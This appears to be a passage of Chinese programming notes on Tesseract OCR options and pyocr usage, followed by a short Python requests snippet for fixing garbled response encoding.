    -l eng：使用英文识别库；
    -psm 7：表示分页方式，7表示将图片视为单行文字；
    digits：识别配置文件，这里表示只识别数字。

查看目前支持那些语言：

tesseract --list-langs # chi_sim chi_tra eng osd
from pyocr import tesseract

builder = tesseract.builders.TextBuilder()
builder.tesseract_configs = ['-psm', '7', 'scbid'] 
result = tesseract.image_to_string(Image.open('ocr_test.png'), 'eng', builder)
```
###[request乱码](https://segmentfault.com/q/1010000008173276)
```js
import requests
word = input('>')
payload = {'keyword':word}
r = requests.get('http://search.bilibili.com/all', params=payload)
print(r.text.encode('utf-8'))
r = requests.get(url, proxies=proxies)
r.encoding = r.apparent_encoding
print r.text
```
